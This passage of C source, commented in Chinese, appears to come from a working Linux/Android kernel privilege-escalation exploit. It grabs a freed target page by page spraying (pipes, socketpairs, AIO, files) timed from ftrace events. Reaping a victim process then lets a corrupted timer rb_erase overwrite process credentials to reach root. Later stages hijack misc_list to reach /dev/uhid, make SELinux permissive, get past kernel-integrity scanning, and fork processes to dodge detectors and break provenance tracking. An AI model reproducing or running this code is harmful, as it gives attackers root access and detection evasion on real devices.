        printf("[GR] 首次 free=%d, 静默 %dms 达成, cum_free=%lld, 前段等待 %lldus → 进入轮次喷涂(命中即停)\n",
               seen, qms, freecnt, now_us() - gf0);
        fflush(stdout);
        sm("[SM] GR 首次free=%d 静默=%dms cum_free=%lld", seen, qms, freecnt);
        /* 不做一次性 mega 突发：v93 实测 15360 页一把喷会在拿到目标块后继续消费
         * free_list 里的重复条目 → panic。w93 成功样本是每轮 2048 页、命中即 break。
         * 因此这里只完成「等最后一次 free」的前置，喷涂仍走下面的轮次循环。 */
    }
    /* [EVGRAB] 事件驱动抢页：free 事件一到立刻分配，命中即停，绝不续喷。
     * 参数：EVGRAB=<每批页数>（默认 2048，对齐 w93 每轮规模）。 */
    if (getenv("EVGRAB")) {
        int32_t me = (int32_t)syscall(SYS_gettid);
        int batch = atoi(getenv("EVGRAB"));
        if (batch <= 0) batch = 2048;
        for (int i = 0; i < nfd; i++) {
            int fl = fcntl(pf[i * 2 + 1], F_GETFL);
            fcntl(pf[i * 2 + 1], F_SETFL, fl | O_NONBLOCK);
        }
        relay_q("echo pfn!=0 > %s/events/kmem/mm_page_free/filter", TRACE_DIR);
        relay_q("echo pfn!=0 > %s/events/kmem/mm_page_alloc/filter", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        tp_open_all();
        /* 参考 GhostKey：用 socketpair 缓冲承担压页，绕开 pipe-user-pages-soft
         * 的 60MB 硬顶（本机实测 SO_SNDBUF 16MB 可生效，EAGAIN=0）。
         * 每个 8KB 写入被拆成 2 个 order-0 数据页，内容都是 4KB 模板。 */
        static unsigned char sbuf[8192];
        memcpy(sbuf, tmpl, 4096);
        memcpy(sbuf + 4096, tmpl, 4096);
        static int sk[SK_PAIRS][2];
        int nsk = 0;
        int snd = 16 << 20;
        for (int i = 0; i < SK_PAIRS; i++) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk[i])) break;
            setsockopt(sk[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof snd);
            setsockopt(sk[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof snd);
            fcntl(sk[i][0], F_SETFL, fcntl(sk[i][0], F_GETFL) | O_NONBLOCK);
            nsk++;
        }
        long long skbud_mb = 1024;
        if (getenv("SGB")) { long long v = atoll(getenv("SGB")); if (v > 0) skbud_mb = v; }
        printf("[EV] socketpairs=%d (%dMB each, budget=%lldMB)\n", nsk, snd >> 20, skbud_mb);
        fflush(stdout);
        long long budget = skbud_mb * 256;          /* MB → 页 */
        long long used = 0;
        long long q = batch / 2; if (q < 1) q = 1;
        int mine = 0;
        int armed = 0;              /* 见过首次 free 之后才持续喷：free 之前喷纯属浪费预算 */
        long long t0 = now_us();
        for (int it = 0; it < 1200 && !mine; it++) {
            int nf = tp_poll(g_head_pfn, g_node_pfn, me, &mine, 1);
            freecnt += nf;
            if (nf > 0) armed = 1;
            if (mine) break;
            if (armed && nsk > 0 && used < budget) {
                long long b = 0;
                for (long long w = 0; w < q && used < budget; w++) {
                    int ok = 0;
                    for (int t = 0; t < nsk; t++) {
                        int j = (int)((w + t) % nsk);
                        if (write(sk[j][0], sbuf, 8192) == 8192) { ok = 1; break; }
                    }
                    if (!ok) break;              /* 全部 socket 缓冲满：本轮到此为止 */
                    b++; used += 2; pages += 2;
                }
                printf("[EV] it=%d free+=%d cum=%lld batch=%lld used=%lld/%lld\n",
                       it, nf, freecnt, b, used, budget);
                fflush(stdout);
            }
            usleep(it < 400 ? 1000 : 3000);
        }
        if (mine) { gate = 1; arund = 1; }
        printf("[EV] done mine=%d o1=%d cum_free=%lld used=%lld pages=%lld sk=%d in %lldus\n",
               mine, g_ev_o1, freecnt, used, pages, nsk, now_us() - t0);
        fflush(stdout);
        sm("[SM] EV mine=%d cum_free=%lld used=%lld", mine, freecnt, used);
        tp_close_all();
        goto ev_done;
    }
    for (int rd = 1; rd <= g_rounds; rd++) {
        if (g_cgate) { gate = 1; arund = 99; break; }   /* 连续喷涂已拿到目标页, 跳过单发喷涂 */
        /* relay 不支持带空格/|| 的 filter, 只做复位; pfn 匹配在用户态做 */
        relay_q("echo pfn!=0 > %s/events/kmem/mm_page_free/filter", TRACE_DIR);
        relay_q("echo pfn!=0 > %s/events/kmem/mm_page_alloc/filter", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);

        if (g_spray_cpu >= 0) pin_cpu(g_spray_cpu);
        long long t0 = now_us();
        long long np = 0;
        if (g_fspray_mb > 0) {
            np = spray_file(tmpl, g_fspray_mb);
        } else if (g_naio > 0) {
            np = spray_aio_round(tmpl, g_off, g_naio);
        } else {
            /* 把 64MB pipe 配额切成 g_rounds 份, 每轮只用 1/g_rounds:
             * 这样每一轮都有**新的** UNMOVABLE 页申请(而不是一次喷完后干等),
             * 且每轮结束都 scan 一次 trace —— discard 无论落在哪一轮, 后面
             * 总有该轮的页申请来抢它。pipe 页一出就被写满 4KB 模板, 内容受控。 */
            int chunk = (nfd + g_rounds - 1) / g_rounds;
            int pi0 = (rd - 1) * chunk, pi1 = pi0 + chunk;
            if (pi1 > nfd) pi1 = nfd;
            long long rp = (long long)(pi1 - pi0) * ppp;
            long long pace_us = 0;
            if (rp > 32 && g_spray_ms > 0)
                pace_us = ((long long)g_spray_ms * 1000 / g_rounds) / (rp / 32);
            /* [B13p] 目标 8KB 块一旦已 free, 就不再按 -y 节奏摊平剩余轮次:
             * 用同样的总页数, 但把 wall-clock 从 300~900ms 压到 ~50ms。
             * 实测成功样本 alloc_round=1/2, 失败样本=4/6, 差别就是"free 之后多久抢到"。 */
            if (freecnt > 0 && rd > 1) {
                if (pace_us > 0)
                    printf("[B13p] round %d: 已见 free=%lld → 取消 pacing, 满速喷涂\n",
                           rd, freecnt);
                pace_us = 0;
            }
            long long np0 = np;
            for (int i = pi0; i < pi1; i++)
                while (write(pf[i * 2 + 1], tmpl, sizeof tmpl) == (ssize_t)sizeof tmpl) {
                    np++;
                    long long in = np - np0;
                    if (pace_us > 0 && (in % 32) == 0) {
                        long long due = t0 + (in / 32) * pace_us;
                        long long el = now_us();
                        if (due > el) usleep((unsigned)((due - el) > 50000 ? 50000 : (due - el)));
                    }
                }
        }
        pages += np;
        long long t1 = now_us();
        if (!g_blind) {
            usleep(50000);
            trace_scan(g_head_pfn, g_node_pfn, &tg);
        }
        freecnt += tg.nfree;
        printf("[B13] round %d: %s pages=%lld(total %lld) in %lldus | free(n=%d mt=%d) "
               "alloc(node pfn=%llu n=%d mine=%d mine_unmov=%d mt=%d order=%d) cum_free=%lld\n",
               rd, g_naio > 0 ? "aio" : "pipe", np, pages, t1 - t0, tg.nfree, tg.mt_free,
               (unsigned long long)g_node_pfn, tg.nalloc, tg.nalloc_mine,
               tg.nalloc_mine_unmov, tg.mt_mine, tg.ord_mine, freecnt);
        for (int k = 0; k < tg.nln; k++)
            printf("       trace| %s\n", tg.ln[k]);
        /* gate 只认 UNMOVABLE(order-0): 这才是 pipe/slab 同一条 buddy 链表上的分配,
         * MOVABLE 的 page cache 即使拿到同一 pfn 也不是我们的模板内容。 */
        if (g_blind) continue;          /* 盲开火: 不做 pfn 判定, 喷满全部轮次 */
        if (tg.nalloc_mine_unmov) {
            if (g_insert) {
                /* 仅打印诊断, 不作否决条件。实测(uroot6)成功那跑同样只拿到 tail 页就 PASS，
                 * 说明插入是否成立取决于 clock(-t) 决定的树形态，而不是 head 页归属。 */
                int hm = trace_head_alloc_mine(g_head_pfn, (int)getpid());
                printf("[B14] head pfn=%llu 归本进程的 alloc=%d (仅参考, 不否决 gate)\n",
                       (unsigned long long)g_head_pfn, hm);
            }
            gate = 1;
            arund = rd;
            break;
        }
        if (tg.nalloc_mine && !tg.nalloc_mine_unmov)
            printf("   → 该 pfn 被本进程拿到, 但 migratetype=%d order=%d, 不是 UNMOVABLE 页, "
                   "内容不可信 ⇒ 不通过 gate\n", tg.mt_mine, tg.ord_mine);
        if (!tg.nfree) {
            printf("   → 本轮目标页没被分配(也可能根本没有 free 事件)\n");
        }
    }
    if (g_blind && !g_cgate) {
        gate = 1; arund = g_rounds;
        printf("[BB] 盲开火: 已喷满 %d 轮 pages=%lld, 跳过 pfn 判定直接进 reap (无安全网)\n",
               g_rounds, pages);
        fflush(stdout);
    }
ev_done:
    /* [诊断] ALLROUNDPARK=1：把全部喷涂轮次跑完，但仍在 reap 之前停下。
     * 用途：把「持续喷涂」与「reap 清理」两个候选分开。 */
    if (getenv("ALLROUNDPARK")) {
        printf("[P] ALLROUNDPARK=1：喷涂全部结束（rounds=%d pages=%lld），reap 前挂起 "
               "gate=%d alloc_round=%d free_cnt=%lld target_pfn=%llu\n",
               g_rounds, pages, gate, arund, freecnt, (unsigned long long)g_node_pfn);
        fflush(stdout);
        for (;;) sleep(3600);
    }
    printf("[B15] GATE=%s (target pfn 被**本进程**以 UNMOVABLE 页拿到=%d, 本进程任意=%d, 任意进程=%d)"
           " | alloc_round=%d free_cnt=%lld%s\n",
           gate ? "PASS" : "FAIL",
           g_cgate ? g_cmine : tg.nalloc_mine_unmov,
           g_cgate ? g_cmine : tg.nalloc_mine,
           g_cgate ? g_cany : tg.nalloc,
           arund, freecnt,
           g_cgate ? "  [连续喷涂]" : "");
    sm("[SM] B15 gate=%d mine_unmov=%d mine=%d any=%d mt=%d ord=%d",
       gate, tg.nalloc_mine_unmov, tg.nalloc_mine, tg.nalloc, tg.mt_mine, tg.ord_mine);
    if (!gate) {
        int rb = g_naio > 0 ? spray_aio_readback(g_off, g_node_va, 0) : 0;
        printf("== VERDICT: PARKED (喷涂未命中; 不 reap, 保持挂起; readback=%d)\n", rb);
        sm("[SM] PARKED gate fail, 保持挂起不 reap");
        /* gate 失败 ⇒ 我们没有任何页别名到目标块, 这时把 60MB pipe 配额还回去是安全的
         * (不影响 victim 的树, 也不影响后续 run 的喷涂能力)。reap 才是危险动作, 不做。 */
        if (g_pf && g_npf > 0) {
            for (int i = 0; i < g_npf; i++) { close(g_pf[i * 2]); close(g_pf[i * 2 + 1]); }
            printf("[B15c] 已释放 %d 个 pipe 的配额(仅为归还 pipe-user-pages, 不碰 victim)\n", g_npf);
            g_pf = NULL; g_npf = 0;
        }
        self_protect();
        for (;;) pause();
    }
    /* [火门-硬条件] 晚抢样本一律弃用。
     * 实测: 成功样本 alloc_round=1(11-09 19e1200000) / =2(11-10 2a39200000);
     *       失败样本 alloc_round=4/6, 全部在 B21 返回 ESPIPE(29)。
     * 晚抢 = 目标 8KB 块的 tail 页在 free 之后又隔了 2~4 轮(300~900ms)才被本进程 pipe
     * 拿到, 此时该页已换过一代, reap 的 rb_erase 写原语落不到我们 alias 的页上,
     * misc_list 没被改成指向假节点 → open("/dev/uhid") 命中真设备
     * (真 uhid 用 nonseekable_open 清掉 FMODE_PWRITE) → pwrite 必返 ESPIPE。
     * 因此 alloc_round>2 直接弃用: 不 reap、不释放 pipe(页仍被我们 alias, 释放有风险)。 */
    if (!g_blind && !g_cgate && !getenv("GRAB") && !getenv("EVGRAB") && arund > 2) {
        printf("[B15r] REJECT 晚抢样本: alloc_round=%d > 2 (free_cnt=%lld, pfn=%llu) "
               "→ 弃用驻留, 不进 reap\n",
               arund, freecnt, (unsigned long long)g_node_pfn);
        fflush(stdout);
        sm("[SM] B15r reject late-grab arund=%d free=%lld", arund, freecnt);
        self_protect();
        for (;;) pause();
    }
    /* 火门(方案1): 复刻 w93 成功样本的 free→抢页节奏。
     * w93: 目标页跨 round1~3 被 free 3 次, round4 才被本进程抢到 → 成功;
     * r93: round1 只 free 1 次就被同轮抢走 → reap 直接 panic。
     * 因此 alloc_round<2 或 free_cnt<3 时标 GATE_REJECT: 丢弃该 victim, 不进 reap。
     * 不 reap 且保持 pipe/zombie 共存(与 PARKED 同样的安全姿态), 避免 release_task 踩脏树。 */
    /* [火门-实测] 抢到目标页后继续监听 800ms，确认该页不再被 free。
     * 依据 a17e(成功样本): 两次 discard 分别是 895.560690(SensorService) / 896.216533(v-read)，
     *   间隔约 656ms；本进程直到 round4 才抢到 → free_cnt=2 只是「两次 discard 已完成」的代理。
     *   真正的危险是「抢到之后又被 free」(二次 free 踩自己持有的 pipe 页 → panic)。
     * 因此直接测危险本身：清 trace → 等 800ms → 扫 head pfn 的 mm_page_free。
     *   无新 free ⇒ 安全，进 reap；有新 free ⇒ 抢早了，弃用驻留(不 reap)。 */
    if (gate && !g_blind && !getenv("POSTFREE") && !getenv("GRAB") && !getenv("EVGRAB")) {
        int wms = 800;
        relay_q("echo pfn!=0 > %s/events/kmem/mm_page_free/filter", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        usleep((useconds_t)wms * 1000);
        trace_scan(g_head_pfn, g_node_pfn, &tg);
        long long extra = tg.nfree;
        printf("[B15w] 抢到后监听 %dms: 新增 free=%lld (此前 free_cnt=%lld, alloc_round=%d) → %s\n",
               wms, extra, freecnt, arund, extra ? "抢早了, 弃用" : "安全, 进 reap");
        fflush(stdout);
        sm("[SM] B15w watch=%dms extra_free=%lld prev_free=%lld arund=%d",
           wms, extra, freecnt, arund);
        if (extra) {
            self_protect();
            for (;;) pause();
        }
        freecnt += extra;
    }
    /* [诊断] GATEPARK=1：GATE 命中（已抢到目标页）后立刻停下，不 reap、不释放 pipe。
     * 用途：二分「崩点在抢页/分配路径」还是「崩点在 reap 的 timer 清理」。 */
    if (getenv("GATEPARK")) {
        printf("[P] GATEPARK=1：GATE 命中后挂起（不 reap、不释放 pipe）alloc_round=%d free_cnt=%lld "
               "target_pfn=%llu\n", arund, freecnt, (unsigned long long)g_node_pfn);
        fflush(stdout);
        for (;;) sleep(3600);
    }
    if (g_naio > 0) {
        int pre = spray_aio_readback(g_off, g_node_va, 1);
        if (pre) printf("[B15b] 警报: reap 之前就出现 pc==node_va (%d 处), 说明有别的路径写过\n", pre);
    }

    /* ---- P13: reap → 触发 posix_cpu_timers_exit_group(sig) → rb_erase(假 node) ---- */
ps_reap:
    if (g_lifetrace) {
        /* 取证: 把 ring 缩到 256KB 并清空, 只保留"reap 之后"的生命周期事件。
         * 若进程在 reap 后立刻被收走, trace 里只剩 signal_generate(sig=9, SI_KERNEL)
         * + sched_process_exit, 主机侧一次 cat 就能全量取回。 */
        relay_q("echo 256 > %s/buffer_size_kb", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        printf("[B16t] trace 已缩小并清空(256KB), 只保留 reap 后的 signal/exit\n");
        fflush(stdout);
    }
    printf("[B16] REAP %d ...\n", victim);
    sm("[SM] B16 即将 reap victim=%d (写原语在此发生)", victim);
    SH->stop = 1;
    int wst = 0;
    waitpid(victim, &wst, 0);
    usleep(60000);
    printf("[B17] reap done status=%#x\n", wst);
    sm("[SM] B17 reap done status=%#x 写原语已执行", wst);
    /* [最小复现] MSTOP：只做竞态+reap，不建桥、不改 cred、不做 sid/avc/pid/module */
    if (getenv("MSTOP")) {
        printf("[M] MSTOP=1 最小复现：reap 已完成，未建桥/未改 cred，原地挂起观察\n");
        fflush(stdout);
        for (;;) sleep(3600);
    }
    /* 链内自测: 就在写落地之后、任何 sleep 之前, 用本进程真实身份去读 0600 文件 */
    if (g_selfprobe)
        self_probe_files(g_noff > 1 ? (g_wround + 1 == g_noff ? "末轮 reap 后" : "本轮 reap 后")
                                    : "reap 后");
    /* 方案 B stage1: reap 一结束立刻建桥（插入→open→修复），把脏链窗口压到最短 */
    if (g_insert) {
        fflush(stdout);
        if (g_gtgt) {
            /* -d 模式：不建桥，只做一次通用 .data 写，写完原地挂起（不退出） */
            printf("[G1] 通用 .data 写完成: tgt=%#llx val=%#llx (pc=%#llx)\n",
                   (unsigned long long)g_gtgt, (unsigned long long)g_gval,
                   (unsigned long long)(g_gtgt - 8));
            fflush(stdout);
            /* 写完就地挂起，绝不退出：退出会走 exit/release_task 清理脏 timer 链，
             * 实测即在 release_task+0x2d8 解引用假节点 → oops → panic 重启。 */
            for (;;) pause();
        }
        int irc = ins_bridge();
        printf("[B19] stage1 完成 rc=%d\n", irc);
        fflush(stdout);
        /* [STAGE1 隔离] BRSTOP：建桥+修链已完成，不继续改 cred/HKIP，持页挂起观察。
         * 必须持页：misc_list.next=Pnode 指向本页假设备，提前 close 会让链表悬空。 */
        if (getenv("BRSTOP")) {
            printf("[BS] BRSTOP=1: STAGE1 建桥/修链完成 rc=%d, 未改 cred, 持页挂起观察\n", irc);
            fflush(stdout);
            for (;;) sleep(3600);
        }
        if (g_aawl) aawl_loop();            /* 桥建成后常驻，接受任意写命令 */
        if (g_act) act_scan_bypass();       /* 先让巡检失效 + SELinux permissive */
        if (g_ucmd) {
            int pr = g_fakecred ? fakecred_root() : root_probe_patch();
            printf("[U] root_probe_patch rc=%d\n", pr);
            fflush(stdout);
            if (pr == 0) root_worker_forever();
            printf("[U] patch 未全成功，仍驻留保住桥\n");
            fflush(stdout);
            for (;;) sleep(3600);
        }
    }
    /* 写原语是否命中真实目标, 第一手证据在这里: cred 被清零后本进程立刻应为 uid 0。
     * 这里全部用裸 write(1,...) 输出: 不用 stdio / 不用 getuid 之外的任何中间层,
     * 这样"进程在哪一步消失"能直接从日志看出来。 */
    {
        char b[160];
        int n;
        /* 先停 20s 并把自己的真实身份暴露给外部: 另一个 shell 的 ps 会显示本进程的
         * user(uid)。若写原语命中 cred+0x4, 这 20s 内 ps 的 USER 列会从 shell 变成 root。
         * 若进程在这 20s 内消失, 则说明 reap 之后有外部力量(内核 oops/信号)拿掉我们,
         * 与 getuid 无关。 */
        n = snprintf(b, sizeof b, "[B17s] 停在 reap 后 20s, 等外部 ps 观察 uid (pid=%d)\n",
                     (int)getpid());
        if (write(1, b, n) < 0) {}
        sleep((g_insert || g_selfprobe || g_hkip || getenv("DSTOP")) ? 0 : 20);
        n = snprintf(b, sizeof b, "[B17a] alive (before getuid), pid=%d\n", (int)getpid());
        if (write(1, b, n) < 0) {}
        int u0 = (int)getuid();
        n = snprintf(b, sizeof b, "[B17b] getuid()=%d\n", u0);
        if (write(1, b, n) < 0) {}
        int u1 = (int)geteuid();
        n = snprintf(b, sizeof b, "[B17c] geteuid()=%d\n", u1);
        if (write(1, b, n) < 0) {}
        int g0 = (int)getgid();
        n = snprintf(b, sizeof b, "[B17d] getgid()=%d\n", g0);
        if (write(1, b, n) < 0) {}
        n = snprintf(b, sizeof b, "[B17u] getuid=%d geteuid=%d getgid=%d getegid=%d\n",
                     u0, u1, g0, (int)getegid());
        if (write(1, b, n) < 0) {}
    }
    if (g_ftrace) ftrace_off();
    if (g_dverify) {
        /* 自证采样页来源跟着喷涂链路走: pipe → 从 pipe 读端回读; -F → 读 sp.bin */
        if (g_fspray_mb > 0) dv_scan();
        else                 pipe_scan();
    }
    /* [reap 隔离实验] DSTOP：配合 -D 使用。自证写只落在本页 MARK，不碰 misc_list /
     * 任何全局表，reap 后回读 pipe 页证明"rb_erase 确实命中假节点"，然后原地挂起。
     * 用于把 reap 路径的稳定性与"脏 misc_list"这个持久副作用彻底分开。 */
    if (getenv("DSTOP")) {
        if (!g_dverify) {
            printf("[DS] 警告: DSTOP=1 但未带 -D → 没有自证写, 仅挂起观察\n");
        } else {
            printf("[DS] DSTOP=1: 自证回读已完成(命中页数见上), 未建桥/未碰 misc_list, "
                   "原地挂起观察\n");
        }
        fflush(stdout);
        for (;;) sleep(3600);
    }
    int rb_hits = 0;
    if (g_naio > 0) {
        rb_hits = spray_aio_readback(g_off, g_node_va, 1);
        printf("[B17b] READBACK HITS=%d / %d ctx × %zu 页\n", rb_hits, g_nctx, g_ring_pages);
    }
    if (g_tmode) {
        char cb[128] = { 0 };
        char path[64];
        snprintf(path, sizeof path, "/proc/%d/comm", probe);
        int fd = open(path, O_RDONLY);
        int n = fd >= 0 ? (int)read(fd, cb, sizeof cb - 1) : -1;
        if (fd >= 0) close(fd);
        if (n > 0) { cb[n] = 0; char *nl = strchr(cb, '\n'); if (nl) *nl = 0; }
        printf("[B18] /proc/%d/comm = '%s' (len=%d)\n", probe, n > 0 ? cb : "?", n);
        printf("== VERDICT: %s (readback=%d)\n",
               ((n == 1 && cb[0] == 0) || n <= 0) ? "WRITE OK (comm 已被清零)" : "NO EFFECT",
               rb_hits);
        /* -X: 生命周期测试。comm 不是安全字段, 写它不会改变任何权限,
         * 因此这里复现的是"成功后 fork/父退出/子接管"这一段, 用于定位 Killed。 */
        if (g_xrounds > 0 && g_wround + 1 < g_xrounds) {
            printf("[R1] t=%lldms 轮成功(comm), 父 pid=%d 退出, fork 子进程接管剩余 %d 轮\n",
                   now_us() / 1000, getpid(), g_xrounds - g_wround - 1);
            fflush(stdout);
            kill(probe, SIGKILL);
            waitpid(probe, NULL, 0);
            pid_t nx = fork();
            if (nx == 0) {
                g_wround++;
                setsid();
                signal(SIGHUP, SIG_IGN);
                signal(SIGINT, SIG_IGN);
                signal(SIGTERM, SIG_IGN);
                signal(SIGPIPE, SIG_IGN);
                for (int i = 0; i < g_nfd; i++) close(g_fd[i]);
                g_nfd = 0;
                goto round_begin;
            }
            if (nx < 0) printf("[-] fork 下一轮失败 errno=%d\n", errno);
            _exit(0);
        }
        kill(probe, SIGKILL);
        waitpid(probe, NULL, 0);
        if (g_cchild) { reap_all_children("[C1c]"); _exit(0); }
        printf("[B19] keep alive 3s\n");
        sleep(3);
        return 0;
    }
    {
        uid_t ru, eu, su; gid_t rg, eg, sg;
        uid_t rfsu = 0, efsu = 0; gid_t rfsg = 0, efsg = 0;
        getresuid(&ru, &eu, &su);
        getresgid(&rg, &eg, &sg);
#ifdef __NR_setfsuid
        rfsu = (uid_t)syscall(__NR_setfsuid, (uid_t)-1);   /* 查询并不改变 */
        rfsg = (gid_t)syscall(__NR_setfsgid, (gid_t)-1);
#endif
        if (g_leak_tid) {
            int a = -1, b2 = -1, c2 = -1, d2 = -1;
            target_uid_state(&a, &b2, &c2, &d2);
            printf("[B18] (靶 %d) ruid=%d euid=%d suid=%d fsuid=%d | 本进程 ruid=%d\n",
                   (int)g_leak_tid, a, b2, c2, d2, (int)ru);
        } else {
            printf("[B18] ruid=%d euid=%d suid=%d fsuid=%d | rgid=%d egid=%d sgid=%d fsgid=%d\n",
                   (int)ru, (int)eu, (int)su, (int)rfsu, (int)rg, (int)eg, (int)sg, (int)rfsg);
        }
        sm("[SM] B18 回读: 靶 ruid=%d euid=%d suid=%d fsuid=%d (本进程 uid=%d)",
           (int)ru, (int)eu, (int)su, (int)rfsu, (int)getuid());
    }
    {
        int hit0;
        if (g_nop) {
            /* 指针写模式: 判定标准是靶的 CapEff 是否非 0 (cred 换成 init_cred 后
             * CapEff 必为 0x1ffffffffff)。不看 uid —— 靶可能本来就是 0。 */
            char pb[64], bb[2048] = { 0 };
            int vpid = g_leak_tid ? g_leak_tid : g_probe_pid;
            snprintf(pb, sizeof pb, "/proc/%d/status", vpid);
            int f2 = open(pb, O_RDONLY);
            int n2 = f2 >= 0 ? (int)read(f2, bb, sizeof bb - 1) : -1;
            if (f2 >= 0) close(f2);
            unsigned long long cape = 0;
            if (n2 > 0) {
                bb[n2] = 0;
                char *q = strstr(bb, "CapEff:");
                if (q) cape = strtoull(q + 7, NULL, 16);
            }
            hit0 = (cape != 0);
            printf("== VERDICT: 指针写 %#llx = %#llx → %s (靶 CapEff=%#llx readback=%d)\n",
                   (unsigned long long)g_target, (unsigned long long)g_ops_v[g_wround],
                   hit0 ? "WRITE OK" : "NO EFFECT", cape, rb_hits);
        } else if (g_leak_tid) {
            int a = -1, b2 = -1, c2 = -1, d2 = -1;
            target_uid_state(&a, &b2, &c2, &d2);
            hit0 = (a == 0 || b2 == 0 || c2 == 0 || d2 == 0);
        } else {
            hit0 = (getgid() == 0 || getegid() == 0 || getuid() == 0 || geteuid() == 0);
        }
        printf("== VERDICT: cred+%#llx 清零 → %s (readback=%d)\n",
               (unsigned long long)g_credoff, hit0 ? "WRITE OK" : "NO EFFECT", rb_hits);
    }
    /* 每轮结束必须归还 pipe 配额。原因(2026-10-29 实测):
     * pipe-user-pages-soft 是 16384 页(64MB)/用户, 我们用 60 个 1MB pipe 顶到 60MB;
     * 若第 1 轮结束不 close, 第 2 轮的喷涂只能再分到 ~470 页就 EAGAIN,
     * 于是"gate 永远 FAIL"—— 4 个 offset 的多轮写链必然死在第 2 轮。
     * 此时 reap 已经完成, 假节点早被 rb_erase 摘掉, close 完全安全。 */
    if (g_pf && g_npf > 0) {
        int n = g_npf;
        for (int i = 0; i < n; i++) { close(g_pf[i * 2]); close(g_pf[i * 2 + 1]); }
        g_pf = NULL; g_npf = 0;
        printf("[B18p] 已 close %d 个 pipe, 归还 %dMB 配额(供下一轮喷涂)\n", n, n * 1);
    }
    if (g_cchild && g_gfork < 0) {
        /* -G 负数: 心跳模式 —— 只测量"cred 已改 → 被杀"的存活窗口, 不 fork */
        int64_t t0 = now_us();
        int secs = -g_gfork;
        printf("[H0] t=%lldms 刀 pid=%d 写完 cred, 开始心跳 (每 50ms), 上限 %ds\n",
               (long long)(t0 / 1000), getpid(), secs);
        fflush(stdout);
        for (int k = 0; k < secs * 20; k++) {
            usleep(50000);
            printf("[H1] 刀 pid=%d 存活 +%lldms getuid=%d\n", getpid(),
                   (long long)((now_us() - t0) / 1000), (int)getuid());
            fflush(stdout);
        }
        printf("[H2] 刀 pid=%d 心跳跑满 +%lldms, 主动退出\n", getpid(),
               (long long)((now_us() - t0) / 1000));
        fflush(stdout);
        reap_all_children("[H2c]");
        _exit(0);
    }
    if (g_cchild && g_gfork) {
        /* -G: 量化"cred 已被改 → 被检测器杀掉"的时间窗, 并测试 fork 出的孙进程
         * 是否继承 root cred 且在刀死后继续存活。刀自己 waitpid 收孙, 不留孤儿。 */
        int64_t t0 = now_us();
        printf("[G0] t=%lldms 刀 pid=%d 写完 cred, 立刻 fork 孙进程 (窗口测量开始)\n",
               (long long)(t0 / 1000), getpid());
        fflush(stdout);
        pid_t gk = fork();
        if (gk == 0) {
            setsid();
            signal(SIGHUP, SIG_IGN); signal(SIGINT, SIG_IGN);
            signal(SIGTERM, SIG_IGN); signal(SIGPIPE, SIG_IGN);
            uid_t r = 0, e = 0, s = 0; gid_t rg = 0, eg = 0, sg = 0;
            getresuid(&r, &e, &s); getresgid(&rg, &eg, &sg);
            printf("[G1] 孙 pid=%d 继承 ruid=%d euid=%d suid=%d | rgid=%d egid=%d | 出生 +%lldms\n",
                   getpid(), (int)r, (int)e, (int)s, (int)rg, (int)eg,
                   (long long)((now_us() - t0) / 1000));
            fflush(stdout);
            for (int k = 0; k < g_gfork * 10; k++) {
                usleep(100000);
                printf("[G1] 孙 pid=%d 存活 +%lldms uid=%d euid=%d\n", getpid(),
                       (long long)((now_us() - t0) / 1000), (int)getuid(), (int)geteuid());
                fflush(stdout);
            }
            printf("[G1] 孙 pid=%d 观察期满 +%lldms 主动退出\n", getpid(),
                   (long long)((now_us() - t0) / 1000));
            fflush(stdout);
            _exit(0);
        }
        int gst = 0;
        waitpid(gk, &gst, 0);
        printf("[G2] 刀 pid=%d 在 +%lldms 收完孙 pid=%d st=%#x; 刀自身 getuid=%d\n",
               getpid(), (long long)((now_us() - t0) / 1000), gk, gst, (int)getuid());
        fflush(stdout);
        reap_all_children("[G2c]");
        _exit(0);
    }
    if (g_noff && g_qtest) {
        /* -Q 隔离实验: 只跑 "cred 已被改 → fork 之后的生命周期", 不再做下一轮。
         * 1 = 子进程 sleep(不做 setsid) 父等 2s 后退出
         * 2 = 子进程立刻 _exit(0), 父 waitpid 后再等 2s 退出
         * 3 = 同 2 但子进程先 setsid() 再 _exit(0) */
        fflush(stdout);
        pid_t qc = fork();
        if (qc == 0) {
            if (g_qtest == 3) setsid();
            printf("[Q%d c] child pid=%d gen=%d %s, ", g_qtest, getpid(), g_wround,
                   g_qtest == 1 ? "sleep 8s" : "exit now");
            fflush(stdout);
            if (g_qtest == 1) { sleep(8); }
            _exit(0);
        }
        printf("[Q%d p] fork ok child=%d; ", g_qtest, qc);
        fflush(stdout);
        if (g_qtest == 2 || g_qtest == 3) {
            int qst = 0;
            waitpid(qc, &qst, 0);
            printf("child reaped st=%#x; ", qst);
            fflush(stdout);
        } else {
            usleep(300000);
        }
        printf("parent(pid=%d) still alive after fork+%s\n", getpid(),
               g_qtest == 1 ? "300ms" : "reap");
        fflush(stdout);
        sleep(2);
        printf("[Q%d p] parent exits now\n", g_qtest);
        fflush(stdout);
        _exit(0);
    }
    if ((g_noff || g_nop) && g_wround + 1 < (g_noff ? g_noff : g_nop)) {
        int nrt = g_noff ? g_noff : g_nop;
        if (g_leak_tid || g_nop || g_selfprobe) {
            /* 外部靶: 本进程始终是干净的 uid=2000, fork 不会被检测器盯上;
             * 但也不必 fork —— 直接原地进入下一轮, 目标仍是同一个 cred 对象。
             * 指针写(-P): 改的是 probe 子进程, worker 自身始终是 uid=2000, 同样原地续轮。
             * 链内自测: 目标就是本进程自己的 cred, 必须原地续轮(同一个 cred 对象)。 */
            g_wround++;
            printf("[R1x] t=%lldms 轮成功, 洁净进程原地继续 %d/%d\n",
                   now_us() / 1000, g_wround + 1, nrt);
            fflush(stdout);
            goto round_begin;
        }
        /* fork-per-round: 本轮的成果由 copy_creds 复制进子进程(值继承),
         * 但子进程拿到的是**新的 cred 对象**(新地址), 由子进程重新泄漏。
         * 父进程立刻退出 → 正在被跟踪的 task_struct 消失, 溯源链断裂。 */
        printf("[R1] t=%lldms 轮成功, 父 pid=%d 准备退出, fork 子进程接管剩余 %d 轮\n",
               now_us() / 1000, getpid(), nrt - g_wround - 1);
        fflush(stdout);
        pid_t nx = fork();
        if (nx == 0) {
            g_wround++;
            /* 子进程自立门户: 父进程是 session leader, 它一退出可能连带子进程被回收。
             * 子进程此时不是 pgroup leader, setsid() 必然成功 → 变成新会话首进程。 */
            setsid();
